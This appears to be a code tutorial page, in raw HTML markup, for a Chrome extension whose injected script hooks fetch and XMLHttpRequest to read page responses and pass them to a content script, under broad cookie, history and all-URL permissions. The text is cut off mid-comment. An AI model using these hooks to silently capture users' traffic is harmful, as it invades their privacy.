&lt;h1 id=&quot;manifest-json&quot;&gt;&lt;a href=&quot;#manifest-json&quot; class=&quot;headerlink&quot; title=&quot;manifest.json&quot;&gt;&lt;/a&gt;manifest.json&lt;/h1&gt;&lt;figure class=&quot;highlight json&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&amp;quot;manifest_version&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;xxx&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&amp;quot;version&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;0.0.1&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&amp;quot;description&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;xxx&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&amp;quot;permissions&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;punctuation&quot;&gt;[&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&amp;quot;contextMenus&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&amp;quot;cookies&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&amp;quot;storage&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&amp;quot;history&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&amp;quot;webRequest&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&amp;quot;webRequestBlocking&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&amp;quot;*://*/*&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&amp;quot;http://www.baidu.com/*&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&amp;quot;tabs&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&amp;quot;content_scripts&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;punctuation&quot;&gt;[&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;attr&quot;&gt;&amp;quot;matches&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;punctuation&quot;&gt;[&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;string&quot;&gt;&amp;quot;http://www.baidu.com/*&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;attr&quot;&gt;&amp;quot;js&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;punctuation&quot;&gt;[&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;string&quot;&gt;&amp;quot;content.js&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;attr&quot;&gt;&amp;quot;run_at&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;document_start&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;attr&quot;&gt;&amp;quot;all_frames&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&amp;quot;browser_action&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;attr&quot;&gt;&amp;quot;default_title&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;xxx&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;attr&quot;&gt;&amp;quot;default_popup&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;popup.html&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&amp;quot;icons&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;attr&quot;&gt;&amp;quot;16&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;icons/icon.png&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;attr&quot;&gt;&amp;quot;32&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;icons/icon.png&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;attr&quot;&gt;&amp;quot;48&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;icons/icon.png&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;attr&quot;&gt;&amp;quot;128&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;icons/icon.png&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&amp;quot;web_accessible_resources&amp;quot;&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;punctuation&quot;&gt;[&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&amp;quot;injected.js&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;punctuation&quot;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&quot;injected-js&quot;&gt;&lt;a href=&quot;#injected-js&quot; class=&quot;headerlink&quot; title=&quot;injected.js&quot;&gt;&lt;/a&gt;injected.js&lt;/h1&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; origFetch = &lt;span class=&quot;variable language_&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;fetch&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;variable language_&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;fetch&lt;/span&gt; = &lt;span class=&quot;keyword&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;...args&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; response = &lt;span class=&quot;keyword&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;title function_&quot;&gt;origFetch&lt;/span&gt;(...args);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// console.log(&amp;#x27;fetch request:&amp;#x27;, args);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; [url] = args&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; data = &lt;span class=&quot;keyword&quot;&gt;await&lt;/span&gt; response&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            .&lt;span class=&quot;title function_&quot;&gt;clone&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            .&lt;span class=&quot;title function_&quot;&gt;json&lt;/span&gt;() &lt;span class=&quot;comment&quot;&gt;// 此处需要根据不同数据调用不同方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            .&lt;span class=&quot;title function_&quot;&gt;catch&lt;/span&gt;(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;params&quot;&gt;err&lt;/span&gt; =&amp;gt;&lt;/span&gt; &lt;span class=&quot;variable language_&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;title function_&quot;&gt;error&lt;/span&gt;(err));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// 对于二进制大文件可以创建为URL(blob:开头)，供其它脚本访问&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;//sessionStorage[&amp;#x27;wave&amp;#x27;] = URL.createObjectURL(data); // 插件需要添加&amp;#x27;storage&amp;#x27;权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// // 只监听某些地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (url === &lt;span class=&quot;string&quot;&gt;&amp;#x27;./xx/xx/xx&amp;#x27;&lt;/span&gt; &amp;amp;&amp;amp; data.&lt;span class=&quot;property&quot;&gt;respData&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;corpOther&lt;/span&gt;.&lt;span class=&quot;title function_&quot;&gt;includes&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;xxxx&amp;#x27;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;variable language_&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;title function_&quot;&gt;postMessage&lt;/span&gt;(&amp;#123; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&amp;#x27;type&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;attr&quot;&gt;data&lt;/span&gt;: data.&lt;span class=&quot;property&quot;&gt;respData&lt;/span&gt; &amp;#125;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;*&amp;#x27;&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;// send to content script&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; response;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 下面为xhr，需要则打开&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;xhr&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;variable constant_&quot;&gt;XHR&lt;/span&gt; = &lt;span class=&quot;title class_&quot;&gt;XMLHttpRequest&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;prototype&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; open = &lt;span class=&quot;variable constant_&quot;&gt;XHR&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;open&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; send = &lt;span class=&quot;variable constant_&quot;&gt;XHR&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;send&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;variable constant_&quot;&gt;XHR&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;open&lt;/span&gt; = &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;method, url&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;variable language_&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;_method&lt;/span&gt; = method;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;variable language_&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;_url&lt;/span&gt; = url;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; open.&lt;span class=&quot;title function_&quot;&gt;apply&lt;/span&gt;(&lt;span class=&quot;variable language_&quot;&gt;this&lt;/span&gt;, &lt;span class=&quot;variable language_&quot;&gt;arguments&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;variable constant_&quot;&gt;XHR&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;send&lt;/span&gt; = &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;postData&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// console.log(&amp;#x27;xhr request:&amp;#x27;, this._method, this._url, postData);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;variable language_&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;title function_&quot;&gt;addEventListener&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;load&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;// sessionStorage[&amp;#x27;key&amp;#x27;] = JSON.stringify(response); // 